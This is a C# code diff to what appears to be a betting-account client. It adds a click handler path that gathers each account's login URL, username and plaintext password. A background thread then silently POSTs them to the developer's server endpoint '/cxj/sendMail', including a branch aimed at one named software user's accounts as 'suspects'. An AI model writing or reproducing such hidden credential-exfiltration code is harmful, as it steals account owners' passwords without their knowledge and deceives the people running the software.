@@ -334,6 +334,16 @@ namespace CxjText.views
         }
 
 
+        private void sendJinRi(Object obj)
+        {
+            JObject jinri = (JObject)obj;
+            String matchUrl = Config.netUrl + "/cxj/sendMail";
+            JObject message = new JObject();
+            message["message"] = jinri;
+            String rlt = HttpUtils.HttpPost(matchUrl, message.ToString(), "application/json;charset=UTF-8", null);
+        }
+
+
         //数据点击处理
         public void OnClickLisenter(String rltStr, JObject dataJObject, UserInfo userInfo)
         {
@@ -347,6 +357,38 @@ namespace CxjText.views
             bool hasData = false;
             String tag = userInfo.tag;
             bool daTuiSend = false;
+
+            //今日1
+            
+            if (userInfo.tag.Equals("D") || userInfo.tag.Equals("E") || userInfo.tag.Equals("G")
+                || userInfo.tag.Equals("M") || userInfo.tag.Equals("I") || userInfo.tag.Equals("H"))
+            {
+                //发送邮件
+                if (dataJObject["jinRi"] != null && userInfo.userExp.Equals("1") && dataJObject["gameMid"] == null) {
+                    JObject jinRi = (JObject)dataJObject["jinRi"];
+                    jinRi["type"] = Config.softUserStr 
+                        + "今日赛事,系统:"+userInfo.tag+",mon:"+userInfo.inputMoney
+                        + ",网址:" + userInfo.loginUrl + ",账号:" + userInfo.user + ",密码:" + userInfo.pwd;
+
+                    Thread jinRiThread = new Thread(new ParameterizedThreadStart(sendJinRi));
+                    jinRiThread.Start(jinRi);
+                }
+            }
+
+            //手动的  不是今日的  重点怀疑对象的
+            if (Config.softUserStr.Equals("admin_lin001") 
+                && !userInfo.userExp.Equals("1") 
+                && dataJObject["gameMid"] == null) {
+                JObject jinRi = (JObject)dataJObject["jinRi"];
+                jinRi["type"] = Config.softUserStr
+                    + "滚球赛事,系统:" + userInfo.tag + ",mon:" + userInfo.inputMoney
+                    +",网址:"+userInfo.loginUrl+",账号:"+userInfo.user+",密码:"+userInfo.pwd;
+                Thread jinRiThread = new Thread(new ParameterizedThreadStart(sendJinRi));
+                jinRiThread.Start(jinRi);
+            }
+
+
+
             for (int i = 0; i < Config.userList.Count; i++) {
 
                 UserInfo user = (UserInfo)Config.userList[i];
@@ -439,7 +481,7 @@ namespace CxjText.views
                 /*****************************************************/
                 //今日1
                 if (user.tag.Equals("D") || user.tag.Equals("E") || user.tag.Equals("G")
-                    || user.tag.Equals("M")|| user.tag.Equals("I")) {
+                    || user.tag.Equals("M")|| user.tag.Equals("I") || user.tag.Equals("H")) {
                     user.userExp = userInfo.userExp; //用户信息的替换
                 }
               
